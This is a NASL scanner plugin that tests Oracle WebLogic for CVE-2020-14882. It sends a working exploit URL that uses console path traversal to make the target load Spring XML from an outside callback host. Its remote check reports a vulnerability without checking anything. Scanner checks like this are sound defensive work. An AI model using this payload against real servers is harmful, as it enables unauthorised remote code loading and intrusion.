include("compat.inc");


if (description)
{
  script_id(51799295);
  script_version("1.3");
  script_name(english:"weblogic CVE-2020-14882");
  script_summary(english:"weblogic CVE-2020-14882");
  script_set_attribute(attribute:"description", value:"weblogic CVE-2020-14882");
  script_set_attribute(attribute:"solution", value:"weblogic CVE-2020-14882");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_dependencies("weblogic_detect.nasl","t3_detect.nasl","weblogic_www_detect.nasl");
  script_require_ports("Services/t3", 7001);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");
include("install_func.inc");
include("dump.inc");

port = get_service(svc:'t3', default:7001, exit_on_fail:TRUE);
result_l = check_local(port:port);
if (result_l['vuln']){
	security_hole(port:port, extra:result_l['report']);
	exit(0);
}
result_r = check_remote(port:port);
if (result_r['vuln']){
	security_hole(port:port, extra:result_r['report']);
	exit(0);
}


function check_remote(port){
	laddress = ".scanner.webpulse.cn";
	pattern = hexstr(rand_str(length:8));
	domain_url = "http://"+pattern+laddress+"/";
	url = '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("'+domain_url+');';
	if (get_kb_list("SSL/Transport/"+port)){
		req = http_get(item:url, port:port);
		ssl_reqs = https_req_get(request:req, port:port);
		sleep(1);
		report = "[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
		return {'vuln':true, 'report':report};
		
	}
	else{
		fast_send = http_send_recv3(method: "GET", port: port, item: url);
		sleep(1);
		report = "[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
		return {'vuln':true, 'report':report};
	}
}

function check_local(port){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}

	var bind_result = bind_sock_tcp();
	if (isnull(bind_result))audit(AUDIT_SOCK_FAIL, port);
	var bind_sock = bind_result[0];
	var bind_port = bind_result[1];
	laddress = compat::this_host();
	pattern = hexstr(rand_str(length:8));

	recv_uri = "http://"+laddress+":"+bind_port+"/"+pattern;

	url = '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("'+recv_uri+');';

	i = 0;
	argv[i++] = "iptables";        
	argv[i++] = "-I";
	argv[i++] = "INPUT";
	argv[i++] = "-p";
	argv[i++] = "tcp";
	argv[i++] = "--dport";
	argv[i++] = bind_port;
	argv[i++] = "-j";
	argv[i++] = "ACCEPT";
	#pread(cmd: "iptables", argv: argv, nice: 5);

	if (get_kb_list("SSL/Transport/"+port)){
		req = http_get(item:url, port:port);
		ssl_reqs = https_req_get(request:req, port:port);
		sleep(1);
		var accept_socks = sock_accept(socket:bind_sock, timeout:10);
		j = 0;
		argv[j++] = "iptables";        
		argv[j++] = "-D";
		argv[j++] = "INPUT";
		argv[j++] = "-p";
		argv[j++] = "tcp";
		argv[j++] = "--dport";
		argv[j++] = bind_port;
		argv[j++] = "-j";
		argv[j++] = "ACCEPT";
		#pread(cmd: "iptables", argv: argv, nice: 5);
		
		if(!accept_socks) exit(0);
		var curl_responses = recv(socket:accept_socks, length:2048, timeout:10);
		if(pattern >< curl_responses){
			return {'vuln':true, 'report':req};
		}
		
	}
	else{
		fast_send = http_send_recv3(method: "GET", port: port, item: url);
		sleep(1);
		var accept_sock = sock_accept(socket:bind_sock, timeout:10);
		j = 0;
		argv[j++] = "iptables";        
		argv[j++] = "-D";
		argv[j++] = "INPUT";
		argv[j++] = "-p";
		argv[j++] = "tcp";
		argv[j++] = "--dport";
		argv[j++] = bind_port;
		argv[j++] = "-j";
		argv[j++] = "ACCEPT";
		#pread(cmd: "iptables", argv: argv, nice: 5);
		if(!accept_sock) exit(0);
		var curl_response = recv(socket:accept_sock, length:2048, timeout:10);
		if(pattern >< curl_response){
			return {'vuln':true, 'report':http_last_sent_request()};
		}
	}
}
	
close(soc);
